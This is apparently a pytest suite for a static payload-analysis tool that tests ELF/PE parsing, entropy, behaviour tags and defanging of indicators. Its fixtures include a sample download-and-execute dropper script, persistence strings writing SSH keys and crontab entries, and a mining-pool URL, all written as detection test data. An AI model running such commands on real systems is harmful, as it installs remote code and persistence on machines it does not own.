"""Unit tests for static payload analysis.

Every binary here is hand-built from a header spec — there is no malware in
this repository and there never should be. That is not only a safety choice:
a synthesised header lets a test say "MIPS, big-endian, statically linked,
stripped" and assert on exactly that, which a real sample cannot do without
shipping the sample.

Two properties get the most attention. Indicators must come back **defanged**,
because the whole point is that an analyst can paste them somewhere without
creating a live link to a malware host. And the parsers must **degrade rather
than raise** on truncated or hostile headers — the offsets being read are
attacker-controlled, and an analyser that crashes on a malformed sample is an
analyser that can be turned off by sending one.
"""

from __future__ import annotations

import struct

import pytest

from pipeline.analysis import static

# --------------------------------------------------------------------------- #
# Fixture builders
# --------------------------------------------------------------------------- #


def elf(
    *,
    machine: int = 0x3E,
    bits: int = 64,
    endian: str = "<",
    e_type: int = 2,
    ph_types: tuple[int, ...] = (1,),
    sh_types: tuple[int, ...] = (),
    trailer: bytes = b"",
) -> bytes:
    """Synthesise an ELF header with the given program/section header types."""
    is_64 = bits == 64
    ehsize = 64 if is_64 else 52
    phentsize = 56 if is_64 else 32
    shentsize = 64 if is_64 else 40

    phoff = ehsize if ph_types else 0
    shoff = (ehsize + phentsize * len(ph_types)) if sh_types else 0

    header = bytearray(ehsize)
    header[0:4] = b"\x7fELF"
    header[4] = 2 if is_64 else 1
    header[5] = 1 if endian == "<" else 2
    header[6] = 1
    header[7] = 3  # Linux
    struct.pack_into(endian + "HH", header, 16, e_type, machine)
    struct.pack_into(endian + "I", header, 20, 1)

    if is_64:
        struct.pack_into(endian + "Q", header, 32, phoff)
        struct.pack_into(endian + "Q", header, 40, shoff)
        struct.pack_into(endian + "HH", header, 54, phentsize, len(ph_types))
        struct.pack_into(endian + "HH", header, 58, shentsize, len(sh_types))
    else:
        struct.pack_into(endian + "I", header, 28, phoff)
        struct.pack_into(endian + "I", header, 32, shoff)
        struct.pack_into(endian + "HH", header, 42, phentsize, len(ph_types))
        struct.pack_into(endian + "HH", header, 46, shentsize, len(sh_types))

    body = bytearray()
    for p_type in ph_types:
        entry = bytearray(phentsize)
        struct.pack_into(endian + "I", entry, 0, p_type)
        body += entry
    for sh_type in sh_types:
        entry = bytearray(shentsize)
        struct.pack_into(endian + "I", entry, 4, sh_type)
        body += entry

    return bytes(header + body + trailer)


def pe(machine: int = 0x14C, sections: int = 3, timestamp: int = 0x60000000) -> bytes:
    """Synthesise an MZ stub plus a PE/COFF header."""
    stub = bytearray(0x40)
    stub[0:2] = b"MZ"
    struct.pack_into("<I", stub, 0x3C, 0x40)
    coff = struct.pack("<HHIIIHH", machine, sections, timestamp, 0, 0, 0, 0)
    return bytes(stub) + b"PE\x00\x00" + coff


MIPS, ARM, AARCH64, X86, X86_64 = 0x08, 0x28, 0xB7, 0x03, 0x3E
PT_LOAD, PT_INTERP = 1, 3
SHT_PROGBITS, SHT_SYMTAB = 1, 2


# --------------------------------------------------------------------------- #
# File typing
# --------------------------------------------------------------------------- #


class TestIdentify:
    @pytest.mark.parametrize(
        ("data", "expected"),
        [
            (b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56, "elf"),
            (b"MZ" + b"\x00" * 62, "pe"),
            (b"PK\x03\x04blah", "zip"),
            (b"\x1f\x8b\x08\x00", "gzip"),
            (b"BZh9", "bzip2"),
            (b"\xfd7zXZ\x00", "xz"),
            (b"Rar!\x1a\x07\x00", "rar"),
            (b"7z\xbc\xaf\x27\x1c", "7z"),
            (b"\x89PNG\r\n", "png"),
            (b"%PDF-1.4", "pdf"),
        ],
    )
    def test_magic_bytes(self, data, expected):
        assert static.identify(data)["file_type"] == expected

    def test_shebang_names_the_interpreter(self):
        assert static.identify(b"#!/bin/sh\necho hi\n")["file_type"] == "script-sh"
        assert static.identify(b"#!/usr/bin/env python3\n")["file_type"] == "script-python"

    def test_unknown_shebang_is_still_a_script(self):
        assert static.identify(b"#!/opt/weird/thing\n")["file_type"] == "script"

    def test_plain_text_is_detected_without_magic(self):
        assert static.identify(b"just some words here\n" * 5)["file_type"] == "text"

    def test_high_byte_content_is_unknown_not_text(self):
        assert static.identify(bytes(range(256)) * 4)["file_type"] == "unknown"

    def test_empty_input(self):
        assert static.identify(b"")["file_type"] == "empty"

    def test_filename_is_never_trusted(self):
        # A .bin that is really a shell script must report as a script.
        assert static.identify(b"#!/bin/bash\nwget x\n")["mime"] == "text/x-shellscript"


# --------------------------------------------------------------------------- #
# ELF
# --------------------------------------------------------------------------- #


class TestParseElf:
    def test_not_an_elf_returns_none(self):
        assert static.parse_elf(b"MZ" + b"\x00" * 100) is None
        assert static.parse_elf(b"") is None

    def test_x86_64_little_endian(self):
        result = static.parse_elf(elf(machine=X86_64))
        assert result["arch"] == "x86-64"
        assert result["bits"] == 64
        assert result["endianness"] == "little"
        assert result["elf_type"] == "executable"

    def test_mips_big_endian_32_bit(self):
        # The IoT case: a router build, not a server build.
        result = static.parse_elf(elf(machine=MIPS, bits=32, endian=">"))
        assert result["arch"] == "mips"
        assert result["bits"] == 32
        assert result["endianness"] == "big"

    @pytest.mark.parametrize(
        ("machine", "name"),
        [(ARM, "arm"), (AARCH64, "aarch64"), (X86, "x86"), (MIPS, "mips")],
    )
    def test_architecture_table(self, machine, name):
        assert static.parse_elf(elf(machine=machine, bits=32))["arch"] == name

    def test_unrecognised_machine_reports_the_raw_value(self):
        # Never silently claim an architecture we do not know.
        assert "unknown(0x" in static.parse_elf(elf(machine=0x7B))["arch"]

    def test_shared_object_type(self):
        assert static.parse_elf(elf(e_type=3))["elf_type"] == "shared-object"

    def test_static_linkage_when_no_interp_segment(self):
        assert static.parse_elf(elf(ph_types=(PT_LOAD,)))["linkage"] == "static"

    def test_dynamic_linkage_when_interp_present(self):
        assert static.parse_elf(elf(ph_types=(PT_LOAD, PT_INTERP)))["linkage"] == "dynamic"

    def test_linkage_unknown_without_program_headers(self):
        # Absent data must read as absent, not as "static".
        assert static.parse_elf(elf(ph_types=()))["linkage"] is None

    def test_stripped_when_no_symbol_table(self):
        assert static.parse_elf(elf(sh_types=(SHT_PROGBITS,)))["stripped"] is True

    def test_not_stripped_when_symtab_present(self):
        assert static.parse_elf(elf(sh_types=(SHT_PROGBITS, SHT_SYMTAB)))["stripped"] is False

    def test_stripped_unknown_without_section_headers(self):
        assert static.parse_elf(elf(sh_types=()))["stripped"] is None

    def test_iot_dropper_shape(self):
        # Static + stripped + MIPS is the shape of an IoT botnet dropper.
        result = static.parse_elf(
            elf(machine=MIPS, bits=32, endian=">", ph_types=(PT_LOAD,), sh_types=(SHT_PROGBITS,))
        )
        assert (result["arch"], result["linkage"], result["stripped"]) == ("mips", "static", True)


class TestElfHostileHeaders:
    def test_truncated_after_magic_does_not_raise(self):
        assert static.parse_elf(b"\x7fELF\x02\x01\x01\x00") is None  # under 20 bytes

    def test_truncated_mid_header_returns_partial(self):
        # 24 bytes is enough for class, endianness, type and machine, and not
        # enough for the program/section header offsets. The readable half must
        # come back and the rest must read as unknown.
        result = static.parse_elf(elf()[:24])
        assert result is not None
        assert (result["bits"], result["arch"]) == (64, "x86-64")
        assert result["linkage"] is None
        assert result["stripped"] is None

    def test_program_header_offset_past_end_of_file(self):
        data = bytearray(elf(ph_types=(PT_LOAD,)))
        struct.pack_into("<Q", data, 32, 0xFFFFFF)  # e_phoff far beyond the buffer
        assert static.parse_elf(bytes(data))["linkage"] is None

    def test_absurd_program_header_count_is_refused(self):
        data = bytearray(elf(ph_types=(PT_LOAD,)))
        struct.pack_into("<H", data, 56, 60000)  # e_phnum
        assert static.parse_elf(bytes(data))["linkage"] is None

    def test_absurd_section_header_count_is_refused(self):
        data = bytearray(elf(sh_types=(SHT_PROGBITS,)))
        struct.pack_into("<H", data, 60, 60000)  # e_shnum
        assert static.parse_elf(bytes(data))["stripped"] is None

    def test_zero_entry_size_is_refused(self):
        data = bytearray(elf(ph_types=(PT_LOAD,)))
        struct.pack_into("<H", data, 54, 0)  # e_phentsize
        assert static.parse_elf(bytes(data))["linkage"] is None

    def test_garbage_class_and_endianness_bytes(self):
        data = bytearray(elf())
        data[4] = 99  # EI_CLASS
        data[5] = 99  # EI_DATA
        result = static.parse_elf(bytes(data))
        assert result["bits"] is None
        assert result["endianness"] is None


# --------------------------------------------------------------------------- #
# PE
# --------------------------------------------------------------------------- #


class TestParsePe:
    def test_not_a_pe_returns_none(self):
        assert static.parse_pe(b"\x7fELF" + b"\x00" * 100) is None

    @pytest.mark.parametrize(
        ("machine", "name"),
        [(0x014C, "x86"), (0x8664, "x86-64"), (0x01C0, "arm"), (0xAA64, "aarch64")],
    )
    def test_machine_table(self, machine, name):
        assert static.parse_pe(pe(machine=machine))["arch"] == name

    def test_section_count_and_timestamp(self):
        result = static.parse_pe(pe(sections=7, timestamp=0x5F000000))
        assert result["sections"] == 7
        assert result["timestamp"] == 0x5F000000

    def test_mz_stub_without_a_pe_header_is_not_parsed_as_pe(self):
        # A DOS executable, or a truncated download.
        assert static.parse_pe(b"MZ" + b"\x00" * 200)["arch"] is None

    def test_lfanew_pointing_past_the_buffer(self):
        data = bytearray(pe())
        struct.pack_into("<I", data, 0x3C, 0xFFFFFF)
        assert static.parse_pe(bytes(data))["arch"] is None

    def test_unrecognised_machine_reports_the_raw_value(self):
        assert "unknown(0x" in static.parse_pe(pe(machine=0x1234))["arch"]


# --------------------------------------------------------------------------- #
# Strings, entropy, behaviour
# --------------------------------------------------------------------------- #


class TestStrings:
    def test_extracts_printable_runs(self):
        data = b"\x00\x01/bin/busybox\x00\xff"
        assert "/bin/busybox" in static.extract_strings(data)

    def test_respects_minimum_length(self):
        assert static.extract_strings(b"\x00abc\x00", min_length=6) == []
        assert "abcdef" in static.extract_strings(b"\x00abcdef\x00", min_length=6)

    def test_extracts_utf16le(self):
        wide = "C:\\Windows\\System32".encode("utf-16-le")
        assert "C:\\Windows\\System32" in static.extract_strings(b"\x00\x00" + wide)

    def test_utf16_can_be_disabled(self):
        wide = "SomeWideString".encode("utf-16-le")
        assert "SomeWideString" not in static.extract_strings(wide, utf16=False)

    def test_duplicates_collapse(self):
        assert static.extract_strings(b"repeated\x00repeated\x00").count("repeated") == 1

    def test_output_is_capped(self):
        data = b"\x00".join(f"string{i:05d}".encode() for i in range(5000))
        assert len(static.extract_strings(data)) <= static.MAX_STRINGS

    def test_very_long_run_is_truncated(self):
        assert len(static.extract_strings(b"A" * 5000)[0]) <= static.MAX_STRING_LEN


class TestEntropy:
    def test_empty_is_zero(self):
        assert static.shannon_entropy(b"") == 0.0

    def test_single_repeated_byte_is_zero(self):
        assert static.shannon_entropy(b"A" * 1000) == 0.0

    def test_uniform_bytes_approach_eight(self):
        assert static.shannon_entropy(bytes(range(256)) * 16) == pytest.approx(8.0)

    def test_english_text_sits_in_the_middle(self):
        text = b"the quick brown fox jumps over the lazy dog. " * 40
        assert 3.0 < static.shannon_entropy(text) < 5.0


class TestBehaviourTags:
    def test_iot_dropper_strings(self):
        tags = static.behaviour_tags(["/bin/busybox BOTNET", "wget http://x/y", "chmod +x /tmp/a"])
        assert {"iot:busybox", "downloader:wget", "dropper:chmod"} <= set(tags)

    def test_persistence_strings(self):
        tags = static.behaviour_tags(["crontab -l", "cat >> /root/.ssh/authorized_keys"])
        assert "persistence:cron" in tags
        assert "persistence:ssh-key" in tags

    def test_miner_strings(self):
        assert "miner:stratum" in static.behaviour_tags(["stratum+tcp://pool.example:3333"])

    def test_matching_is_case_insensitive(self):
        assert "family-string:mirai" in static.behaviour_tags(["MIRAI"])

    def test_benign_strings_produce_nothing(self):
        assert static.behaviour_tags(["Hello world", "libc.so.6"]) == []

    def test_tags_are_sorted_and_unique(self):
        tags = static.behaviour_tags(["wget a", "wget b", "busybox"])
        assert tags == sorted(set(tags))


# --------------------------------------------------------------------------- #
# Indicators — the defanging contract
# --------------------------------------------------------------------------- #


class TestDefang:
    def test_url_is_rendered_inert(self):
        assert static.defang("http://evil.com/x.sh") == "hxxp://evil[.]com/x[.]sh"

    def test_https_keeps_its_s(self):
        assert static.defang("https://a.b/c") == "hxxps://a[.]b/c"

    def test_only_the_scheme_is_rewritten(self):
        assert static.defang("http://x.io/http/y").startswith("hxxp://")

    def test_bare_address_is_defanged(self):
        assert static.defang("198.51.100.9") == "198[.]51[.]100[.]9"


class TestExtractIocs:
    def test_urls_come_back_defanged(self):
        iocs = static.extract_iocs(b"\x00http://198.51.100.9/bins/mips\x00")
        assert iocs["urls"] == ["hxxp://198[.]51[.]100[.]9/bins/mips"]

    def test_no_live_url_survives_extraction(self):
        # The safety property, stated as a test: nothing returned may still be
        # a clickable link.
        data = b"http://a.com/1 https://b.net/2 http://c.org/3"
        for url in static.extract_iocs(data)["urls"]:
            assert not url.startswith("http")

    def test_addresses_are_validated(self):
        iocs = static.extract_iocs(b"999.1.1.1 and 10.0.0.1 and 256.256.256.256")
        assert "10[.]0[.]0[.]1" in iocs["ipv4"]
        assert not any("999" in a for a in iocs["ipv4"])
        assert not any("256[.]256" in a for a in iocs["ipv4"])

    def test_domains_are_found_and_lowercased(self):
        assert "evil[.]top" in static.extract_iocs(b"contact EVIL.TOP now")["domains"]

    def test_duplicates_collapse(self):
        data = b"http://a.com/x http://a.com/x http://a.com/x"
        assert len(static.extract_iocs(data)["urls"]) == 1

    def test_url_stops_at_a_quote(self):
        iocs = static.extract_iocs(b'"http://a.com/x" trailing')
        assert iocs["urls"] == ["hxxp://a[.]com/x"]

    def test_no_indicators_yields_empty_lists(self):
        iocs = static.extract_iocs(b"\x00\x01\x02nothing here\x03")
        assert iocs == {"urls": [], "ipv4": [], "domains": []}

    def test_extraction_is_capped(self):
        data = b" ".join(f"http://host{i}.com/x".encode() for i in range(500))
        assert len(static.extract_iocs(data)["urls"]) <= static.MAX_IOCS


# --------------------------------------------------------------------------- #
# Top level
# --------------------------------------------------------------------------- #


class TestAnalyze:
    def test_reports_hash_and_size(self):
        result = static.analyze(b"hello world")
        assert result["size"] == 11
        assert result["sha256"] == (
            "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9"
        )

    def test_elf_fields_are_promoted_to_the_top_level(self):
        result = static.analyze(elf(machine=MIPS, bits=32, endian=">", sh_types=(SHT_PROGBITS,)))
        assert result["file_type"] == "elf"
        assert result["arch"] == "mips"
        assert result["stripped"] is True
        assert result["format_details"]["endianness"] == "big"

    def test_pe_arch_is_promoted(self):
        result = static.analyze(pe(machine=0x8664))
        assert result["file_type"] == "pe"
        assert result["arch"] == "x86-64"

    def test_script_dropper_end_to_end(self):
        script = (
            b"#!/bin/sh\n"
            b"cd /tmp || cd /var/run\n"
            b"wget http://198.51.100.9/bins/mips -O .x\n"
            b"chmod +x .x\n"
            b"./.x\n"
        )
        result = static.analyze(script)
        assert result["file_type"] == "script-sh"
        assert "downloader:wget" in result["behaviour_tags"]
        assert "dropper:chmod" in result["behaviour_tags"]
        assert result["iocs"]["urls"] == ["hxxp://198[.]51[.]100[.]9/bins/mips"]

    def test_non_binary_has_no_architecture(self):
        result = static.analyze(b"just text, nothing more\n" * 10)
        assert result["arch"] is None
        assert result["format_details"] == {}

    def test_high_entropy_binary_is_flagged_packed(self):
        import os

        blob = b"\x7fELF\x02\x01\x01\x00" + os.urandom(20000)
        assert static.analyze(blob)["likely_packed"] is True

    def test_compressed_container_is_not_flagged_packed(self):
        # A zip is high-entropy by definition; that is not a packing signal.
        import os

        assert static.analyze(b"PK\x03\x04" + os.urandom(20000))["likely_packed"] is False

    def test_low_entropy_binary_is_not_flagged(self):
        assert static.analyze(elf() + b"\x00" * 10000)["likely_packed"] is False

    def test_errors_list_is_present_and_empty_on_clean_input(self):
        assert static.analyze(elf())["errors"] == []

    def test_yara_matches_are_empty_without_the_optional_dependency(self):
        assert isinstance(static.analyze(b"anything")["yara_matches"], list)

    @pytest.mark.parametrize(
        "data",
        [
            b"",
            b"\x00",
            b"\x7fELF",
            b"\x7fELF\xff\xff\xff\xff",
            b"MZ",
            b"MZ" + b"\xff" * 100,
            bytes(range(256)),
            b"#!",
            b"\xff" * 5000,
        ],
    )
    def test_never_raises_on_hostile_or_truncated_input(self, data):
        result = static.analyze(data)
        assert "sha256" in result  # produced an answer rather than an exception


class TestAnalyzeFile:
    def test_reads_and_reports_the_filename(self, tmp_path):
        path = tmp_path / "deadbeef.bin"
        path.write_bytes(elf(machine=ARM, bits=32))
        result = static.analyze_file(path)
        assert result["filename"] == "deadbeef.bin"
        assert result["arch"] == "arm"

    def test_hash_matches_the_content_not_the_name(self, tmp_path):
        path = tmp_path / "wrongname.bin"
        path.write_bytes(b"hello world")
        assert static.analyze_file(path)["sha256"].startswith("b94d27b993")


class TestScanDirectory:
    def test_analyses_every_payload(self, tmp_path):
        (tmp_path / "a.bin").write_bytes(elf(machine=MIPS, bits=32))
        (tmp_path / "b.bin").write_bytes(b"#!/bin/sh\nwget http://a.com/x\n")
        results = static.scan_directory(tmp_path)
        assert len(results) == 2
        assert {r["file_type"] for r in results} == {"elf", "script-sh"}

    def test_ignores_non_payload_files(self, tmp_path):
        (tmp_path / "a.bin").write_bytes(elf())
        (tmp_path / "notes.txt").write_text("not a payload")
        assert len(static.scan_directory(tmp_path)) == 1

    def test_missing_directory_is_not_an_error(self, tmp_path):
        assert static.scan_directory(tmp_path / "nope") == []

    def test_empty_directory(self, tmp_path):
        assert static.scan_directory(tmp_path) == []


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #


class TestCli:
    def test_scan_prints_a_summary(self, tmp_path, capsys):
        (tmp_path / "a.bin").write_bytes(
            elf(machine=MIPS, bits=32, endian=">", sh_types=(SHT_PROGBITS,))
        )
        assert static.main(["--scan", "--dir", str(tmp_path)]) == 0
        out = capsys.readouterr().out
        assert "mips" in out
        assert "stripped" in out

    def test_json_output_is_parseable(self, tmp_path, capsys):
        import json

        path = tmp_path / "a.bin"
        path.write_bytes(b"#!/bin/sh\nwget http://198.51.100.9/x\n")
        assert static.main([str(path), "--json"]) == 0
        parsed = json.loads(capsys.readouterr().out)
        assert parsed[0]["iocs"]["urls"] == ["hxxp://198[.]51[.]100[.]9/x"]

    def test_strings_are_omitted_from_json_by_default(self, tmp_path, capsys):
        import json

        path = tmp_path / "a.bin"
        path.write_bytes(b"#!/bin/sh\necho hello there\n")
        static.main([str(path), "--json"])
        assert "strings" not in json.loads(capsys.readouterr().out)[0]

    def test_strings_flag_includes_them(self, tmp_path, capsys):
        import json

        path = tmp_path / "a.bin"
        path.write_bytes(b"#!/bin/sh\necho hello there\n")
        static.main([str(path), "--json", "--strings"])
        assert "strings" in json.loads(capsys.readouterr().out)[0]

    def test_unreadable_file_is_reported_not_fatal(self, tmp_path, capsys):
        assert static.main([str(tmp_path / "missing.bin")]) == 0
        assert "missing.bin" in capsys.readouterr().err

    def test_no_arguments_is_a_usage_error(self):
        with pytest.raises(SystemExit):
            static.main([])
